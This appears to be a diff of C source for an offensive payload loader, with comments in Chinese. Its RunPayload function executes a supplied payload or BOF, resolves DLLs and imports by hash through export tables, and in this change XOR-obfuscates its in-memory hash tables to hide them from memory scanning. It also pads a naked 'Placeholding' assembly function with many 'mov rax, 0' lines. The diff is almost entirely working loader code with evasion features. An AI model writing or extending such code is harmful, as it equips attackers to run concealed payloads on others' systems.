@@ -5,7 +5,7 @@ int* dllHashList = NULL;
 PDWORD_PTR dllBaseList = NULL;
 
 int impFuncNum = 0;
-int* impFuncHashList = NULL;
+LONGLONG* impFuncHashList = NULL;
 PDWORD_PTR impFuncAddrList = NULL;
 
 __declspec(noinline) int GetHash(char* string, int length);
@@ -61,7 +61,7 @@ int RunPayload(PBYTE pPayload, int payloadSize, int bofFuncHash, char* commandPa
             dllBaseList = (PDWORD_PTR)malloc(1000 * sizeof(DWORD_PTR));
         }
         if (impFuncHashList == NULL) {
-            impFuncHashList = (int*)malloc(1000 * sizeof(int));
+            impFuncHashList = (LONGLONG*)malloc(1000 * sizeof(LONGLONG));
         }
         if (impFuncAddrList == NULL) {
             impFuncAddrList = (PDWORD_PTR)malloc(1000 * sizeof(DWORD_PTR));
@@ -105,10 +105,13 @@ int RunPayload(PBYTE pPayload, int payloadSize, int bofFuncHash, char* commandPa
                 // 获取 DLL 基址
                 DWORD_PTR dllBase = 0;
                 for (int i = 0; i < dllNum; i++) {
+                    XorData((PBYTE)&dllHashList[i], sizeof(int), xor1, xor2);
                     if (dllHashList[i] == dllHash) {
+                        XorData((PBYTE)&dllHashList[i], sizeof(int), xor1, xor2);
                         dllBase = dllBaseList[i];
                         break;
                     }
+                    XorData((PBYTE)&dllHashList[i], sizeof(int), xor1, xor2);
                 }
                 if (!dllBase) {
                     if (dllHash == -1499897628) { // Kernel32
@@ -124,16 +127,20 @@ int RunPayload(PBYTE pPayload, int payloadSize, int bofFuncHash, char* commandPa
                         dllBase = (DWORD_PTR)hDll;
                     }
                     dllHashList[dllNum] = dllHash;
+                    XorData((PBYTE)&dllHashList[dllNum], sizeof(int), xor1, xor2);
                     dllBaseList[dllNum] = dllBase;
                     dllNum++;
                 }
                 // 获取导入函数指针
                 PDWORD_PTR pImpFunc = NULL;
                 for (int i = 0; i < impFuncNum; i++) {
-                    if (impFuncHashList[i] == impFuncHash) {
+                    XorData((PBYTE)&impFuncHashList[i], sizeof(LONGLONG), xor1, xor2);
+                    if (*(int*)&impFuncHashList[i] == dllHash && *(int*)((PBYTE)&impFuncHashList[i] + sizeof(int)) == impFuncHash) {
+                        XorData((PBYTE)&impFuncHashList[i], sizeof(LONGLONG), xor1, xor2);
                         pImpFunc = &impFuncAddrList[i];
                         break;
                     }
+                    XorData((PBYTE)&impFuncHashList[i], sizeof(LONGLONG), xor1, xor2);
                 }
                 if (pImpFunc == NULL) {
                     PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)dllBase;
@@ -145,7 +152,9 @@ int RunPayload(PBYTE pPayload, int payloadSize, int bofFuncHash, char* commandPa
                     for (int i = 0; i < pExportDir->NumberOfNames; i++) {
                         char* funcName = (char*)(dllBase + pAddressOfNames[i]);
                         if (GetHash(funcName, strlen(funcName)) == impFuncHash) {
-                            impFuncHashList[impFuncNum] = impFuncHash;
+                            *(int*)&impFuncHashList[impFuncNum] = dllHash;
+                            *(int*)((PBYTE)&impFuncHashList[impFuncNum] + sizeof(int)) = impFuncHash;
+                            XorData((PBYTE)&impFuncHashList[impFuncNum], sizeof(LONGLONG), xor1, xor2);
                             impFuncAddrList[impFuncNum] = dllBase + pAddressOfFunctions[pAddressOfNameOrdinals[i]];
                             pImpFunc = &impFuncAddrList[impFuncNum];
                             impFuncNum++;
@@ -190,6 +199,106 @@ __declspec(noinline) void XorData(PBYTE data, int dataLength, BYTE xor1, BYTE xo
 
 __attribute__((naked)) void Placeholding() {
     __asm {
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
+        mov rax, 0
         mov rax, 0
         mov rax, 0
         mov rax, 0
